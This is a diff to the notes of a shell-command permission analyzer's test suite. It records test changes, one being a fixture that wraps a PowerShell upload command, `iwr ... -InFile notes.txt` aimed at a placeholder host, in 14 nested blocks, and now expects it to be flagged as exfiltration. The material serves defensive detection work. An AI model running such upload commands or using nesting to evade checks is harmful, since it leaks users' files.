@@ -1246,6 +1246,8 @@ The unrelated package-json and hashtable failures were false shared-budget exhau
 
 `rule-analysis-reuse.test.ts` keeps `echo 'literal text' plain`, the proven result, exact semantic/raw views and cached object identity. It now separately asserts the exact original three parent raw-word calls. After literal proof and repeated rule analysis, it requires those same three calls exactly once plus the two newly inspected child words, `literal` and `text`, exactly once. The former total-three assertion counted only the parent grammar; the new exact call set proves both mandatory literal-body inspection and absence of duplicate parent-rule work. No timing or parser budget changes.
 
+`permission-nested-analysis.test.ts` keeps its original 14 nested `& { ... }` blocks around `iwr https://x.invalid -InFile notes.txt` and its `unproven` result. Only the former null exfiltration expectation changes to the exact existing bare-command upload signal under F: a parser refusal does not erase visible literal-body evidence. The adjacent 16-level POSIX upload and all work/depth assertions remain unchanged.
+
 ### Windows literal/proof cells
 
 ## encoded-bypass-battery — four fixtures / 32 Windows lane cells
